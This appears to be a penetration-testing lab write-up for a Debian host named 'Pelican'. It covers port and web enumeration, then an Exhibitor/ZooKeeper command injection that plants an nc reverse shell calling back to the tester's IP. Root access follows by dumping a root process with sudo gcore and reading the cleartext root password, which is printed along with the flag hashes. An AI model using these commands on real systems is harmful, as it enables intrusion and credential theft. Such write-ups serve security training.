**Metadata**

- IP Address: 192.168.136.98
- Hostname: Pelican
- OS: 	Debian GNU/Linux 10 
- Found Credentials/Users: 
Chalres /
root / ClogKingpinInning731

Main Objectives:

Local.txt = d3d4a25ef534b141302a0566792d517e
Proof.txt = 67b3c3fd706adf0faeb230e9f973d5b1

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
sudo nmap -sS --top-ports 100 -T4 -Pn --max-retries 1 --min-rate 500 --host-timeout 60s -oA nmap/nmap_fast 192.168.136.98
# Fast scan to start with

PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
34051/tcp open  unknown

sudo nmap -sT -p- -T4 -Pn --max-retries 2 --min-rate 300 -oA nmap/nmap_full 192.168.136.98
# Full TCP scan.

PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
34051/tcp open  unknown

nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN nmap/nmap_veryfull 192.168.136.98
# Very full NMAP

PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         syn-ack ttl 61 CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 
8080/tcp  open  http        syn-ack ttl 61 Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        syn-ack ttl 61 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.136.98:8080/exhibitor/v1/ui/index.html
34051/tcp open  java-rmi    syn-ack ttl 61 Java RMI
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=22%CT=1%CU=%PV=Y%DS=4%DC=T%G=N%TM=6944B341%P=x86_64-unknown-linux-gnu)
SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)


sudo nmap -sC -p 22,80,111,139,445,2049 -T4 -oA nmap/nmap_scripts 192.168.136.98
# Run Scripts on open ports

sudo nmap -sU --top-ports 100 -T4 --max-retries 1 --host-timeout 90s --open -oA nmap/udp_fast 192.168.136.98
# Fast UDP scan

PORT     STATE SERVICE
5353/udp open  zeroconf

sudo nmap -sU -p- -T4 --max-retries 0 --min-rate 300 --host-timeout 10m --open -oA nmap/udp_full 192.168.136.98
# Full UDP Scan

PORT     STATE SERVICE
5353/udp open  zeroconf

```

2. Interesting Ports/Services

```
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         syn-ack ttl 61 CUPS 2.2
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 
8080/tcp  open  http        syn-ack ttl 61 Jetty 1.0
8081/tcp  open  http        syn-ack ttl 61 nginx 1.14.2
34051/tcp open  java-rmi    syn-ack ttl 61 Java RMI
5353/udp open  zeroconf
```

3. Port 631 Enumeration

```
631/tcp   open  ipp         syn-ack ttl 61 CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: Forbidden - CUPS v2.2.10

- Looked up vulnerabilites on Exploit DB. Nothing for version 2.2.10

```

4. Web Enumeration 8080

```
 - Visisted http://192.168.136.98:8080/application.wadl and found xml document. 

nikto -h http://192.168.136.98:8080                                                                 
+ Server: Jetty(1.0)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Jetty/1.0 appears to be outdated (current is at least 11.0.6). Jetty 10.0.6 AND 9.4.41.v20210516 are also currently supported.
+ 8120 requests: 0 error(s) and 3 item(s) reported on remote host

gobuster dir -u http://192.168.136.98:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

gobuster dir -u http://192.168.136.98:8080  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

/application.wadl     (Status: 200) [Size: 18901]

gobuster dir -u http://192.168.136.98:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

```

4. Web Enumeration 8081

```
- http://192.168.136.98:8081. Redirected to http://192.168.136.98:8080/exhibitor/v1/ui/index.html. Seems to have started Zookeeper.
  
- Website says Exhibitor for Zookeeper version v1.0
  
- Found possible exploit https://www.exploit-db.com/exploits/48654. 

gobuster dir -u http://192.168.135.98:8081 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

gobuster dir -u http://192.168.135.98:8081  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

gobuster dir -u http://192.168.135.98:8081 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

```

4. Port 2181

```
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)

- Looked up exploit on Exploit DB. Only found DOS.

```

5. Port 34051

```
34051/tcp open  java-rmi    syn-ack ttl 61 Java RMI

- Google'd port and found # CVE-2025-34051. 
- https://www.exploit-db.com/exploits/40500
```

6. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.101.110 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.101.110                  

smbclient //192.168.101.110/Backup -N          
Anonymous login successful


```

7. Port 5353

```
5353/udp open  zeroconf

- Looks like port could possibly leak information. 
  https://www.wolfandco.com/resources/blog/penetration-testers-best-frienddns-llmnr-netbios-ns/
```

8. Possible Exploits

```
- https://www.exploit-db.com/exploits/48654.
```

9. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
- Navigated to the http://192.168.136.98:8080/exhibitor/v1/ui/index.html via redirect from http://192.168.136.98:8081.
- Located the 'java.env script' field.
- Updated the value to $(/bin/nc -e /bin/sh 192.168.45.187 80 &). 
- Commited the changes. 

In the example, ZooKeeper will still launch successfully after the command executes, and it will run the command every time ZooKeeper is re-launched by Exhibitor.
```

2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname
pelican

uname -a
Linux pelican 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux

cat /etc/os-release 2>/dev/null
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"

env
SHELL=/bin/bash
PWD=/opt/zookeeper
LOGNAME=charles
HOME=/home/charles
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
INVOCATION_ID=a1185663407d4bd396e75999bc00561a
TERM=xtermuname
USER=charles
SHLVL=2
JOURNAL_STREAM=9:16322
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env

echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

find / -writable -type d 2>/dev/null | head
/opt/exhibitor
/opt/zookeeper
/opt/zookeeper/recipes
/opt/zookeeper/recipes/election
/opt/zookeeper/recipes/election/src
/opt/zookeeper/recipes/election/src/java
/opt/zookeeper/recipes/election/src/java/org
/opt/zookeeper/recipes/election/src/java/org/apache
/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper
/opt/zookeeper/recipes/election/src/java/org/apache/zookeeper/recipes

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
<er root -perm -4000 -exec ls -ldb {} \; 2>/dev/null                
-rwsr-xr-- 1 root dip 386792 Feb 20  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 14608 Aug 27  2020 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 154352 Mar 21  2019 /usr/bin/ntfs-3g
-rwsr-xr-x 1 root root 55400 Mar  6  2019 /usr/bin/bwrap
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rws--x--x 1 root root 17024 Sep 10  2020 /usr/bin/password-store
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 23288 Jan 15  2019 /usr/bin/pkexec

cat /etc/crontab 2>/dev/null
# *  *  *  *  * user-name command to be executed
@reboot         root    /usr/bin/password-store
@reboot         root    while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 

ls -la /etc/cron.*
total 16
drwxr-xr-x   2 root root 4096 Sep  9  2020 .
drwxr-xr-x 120 root root 4096 Dec 20 16:42 ..
-rw-r--r--   1 root root  285 May 19  2019 anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x   2 root root 4096 Sep 10  2020 .
drwxr-xr-x 120 root root 4096 Dec 20 16:42 ..
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  383 Sep  2  2019 samba

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Sep  9  2020 .
drwxr-xr-x 120 root root 4096 Dec 20 16:42 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x   2 root root 4096 Sep  9  2020 .
drwxr-xr-x 120 root root 4096 Dec 20 16:42 ..
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Sep  9  2020 .
drwxr-xr-x 120 root root 4096 Dec 20 16:42 ..
-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

crontab -l 2>/dev/null

getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep

ls -l /etc/shadow
-rw-r----- 1 root shadow 1203 Sep 10  2020 /etc/shadow

ls -la /  
drwxr-xr-x  20 root    root     4096 Sep 10  2020 .
drwxr-xr-x  20 root    root     4096 Sep 10  2020 ..
lrwxrwxrwx   1 root    root        7 Sep  9  2020 bin -> usr/bin
drwxr-xr-x   3 root    root     4096 Sep  9  2020 boot
drwx------   2 root    root     4096 Sep  9  2020 .cache
drwxr-xr-x  16 root    root     3240 Aug  2  2024 dev
drwxr-xr-x 120 root    root     4096 Dec 20 16:42 etc
drwxr-xr-x   3 root    root     4096 Sep 10  2020 home
lrwxrwxrwx   1 root    root       31 Sep  9  2020 initrd.img -> boot/initrd.img-4.19.0-10-amd64
lrwxrwxrwx   1 root    root       30 Sep  9  2020 initrd.img.old -> boot/initrd.img-4.19.0-8-amd64
lrwxrwxrwx   1 root    root        7 Sep  9  2020 lib -> usr/lib
lrwxrwxrwx   1 root    root        9 Sep  9  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root    root        9 Sep  9  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root    root       10 Sep  9  2020 libx32 -> usr/libx32
drwx------   2 root    root    16384 Sep  9  2020 lost+found
drwxr-xr-x   3 root    root     4096 Sep  9  2020 media
drwxr-xr-x   2 root    root     4096 Sep  9  2020 mnt
drwxr-xr-x   4 root    root     4096 Sep 10  2020 opt
dr-xr-xr-x 140 root    root        0 Aug  2  2024 proc
drwx------  14 root    root     4096 Dec 20 16:42 root
drwxr-xr-x  25 root    root      680 Dec 20 16:42 run
lrwxrwxrwx   1 root    root        8 Sep  9  2020 sbin -> usr/sbin
drwxr-xr-x   2 root    root     4096 Sep  9  2020 srv
dr-xr-xr-x  13 root    root        0 Aug  2  2024 sys
drwxrwxrwt  11 root    root     4096 Dec 20 17:00 tmp
drwxr-xr-x  13 root    root     4096 Sep  9  2020 usr
drwxr-xr-x  12 root    root     4096 Sep 10  2020 var
lrwxrwxrwx   1 root    root       28 Sep  9  2020 vmlinuz -> boot/vmlinuz-4.19.0-10-amd64
lrwxrwxrwx   1 root    root       27 Sep  9  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-8-amd64
drwxr-xr-x   3 charles charles  4096 Sep 10  2020 zookeeper

```

2. User Enumeration

```
# Linux
whoami
charles

id
uid=1000(charles) gid=1000(charles) groups=1000(charles)

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
charles:x:1000:1000::/home/charles:/bin/bash


ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Sep 10  2020 .
drwxr-xr-x 20 root    root    4096 Sep 10  2020 ..
drwxr-xr-x  3 charles charles 4096 Sep 10  2020 charles

sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

```

3. Network Information

```
# Linux
ss -tulwn
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  
udp     UNCONN   0        0                0.0.0.0:49955          0.0.0.0:*     
udp     UNCONN   0        0                0.0.0.0:5353           0.0.0.0:*     
udp     UNCONN   0        0                0.0.0.0:631            0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:445            0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:2181           0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:139            0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:2222           0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:8080           0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:8081           0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:38419          0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     
tcp     LISTEN   0        5                0.0.0.0:631            0.0.0.0:*  

netstat -tulnp 2>/dev/null
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
ps aux
ps -ef

```

4. Loot files.
```
# Linux

grep -R "password" /etc 2>/dev/null | head

ls -la /var/www 2>/dev/null
drwxr-xr-x  3 root root 4096 Sep 10  2020 .
drwxr-xr-x 12 root root 4096 Sep 10  2020 ..
drwxr-xr-x  2 root root 4096 Sep 10  2020 html


find /home -name "*.txt" 2>/dev/null
/home/charles/local.txt

find /home -type f -name "*history*" 2>/dev/null


find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null


grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head

find / -name "*.bak" -o -name "*~" 2>/dev/null | head
/etc/apt/sources.list~
/var/backups/shadow.bak
/var/backups/gshadow.bak
/var/backups/group.bak
/var/backups/passwd.bak
/var/lib/apt/cdroms.list~

ls -la /var/backups
total 1976
drwxr-xr-x  2 root root      4096 Dec 20 16:50 .
drwxr-xr-x 12 root root      4096 Sep 10  2020 ..
-rw-r--r--  1 root root    102400 Dec 20 16:45 alternatives.tar.0
-rw-r--r--  1 root root     78969 Sep 28  2020 apt.extended_states.0
-rw-r--r--  1 root root      8633 Sep 10  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root       465 Sep 10  2020 dpkg.diversions.0
-rw-r--r--  1 root root       195 Sep 10  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root       135 Sep 10  2020 dpkg.statoverride.0
-rw-r--r--  1 root root       142 Sep 10  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   1424318 Sep 28  2020 dpkg.status.0
-rw-r--r--  1 root root    358679 Sep 28  2020 dpkg.status.1.gz
-rw-------  1 root root       862 Sep 10  2020 group.bak
-rw-------  1 root shadow     715 Sep 10  2020 gshadow.bak
-rw-------  1 root root      2013 Sep 10  2020 passwd.bak
-rw-------  1 root shadow    1203 Sep 10  2020 shadow.bak

```

5. Automated Enumeration

```




```
5. Possible PE Paths

```
- # *  *  *  *  * user-name command to be executed
@reboot         root    /usr/bin/password-store
@reboot         root    while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done

- -rwsr-xr-x 1 root root 154352 Mar 21  2019 /usr/bin/ntfs-3g
  
- (ALL) NOPASSWD: /usr/bin/gcore
```

**Privilege Escalation**

1. PE Steps

```
- Did some research and saw that it's possible to dump a process using sudo gcore PID.
- Ran ps -ef |grep root
- Found an interesting process
  root       494     1  0 16:40 ?        00:00:00 /usr/bin/password-store
- Dumped process 
  sudo gcore 494
- Used strings to view cleartext data in file 
  strings core.494

001 Password: root:
ClogKingpinInning731

```

2. Notes

```

```

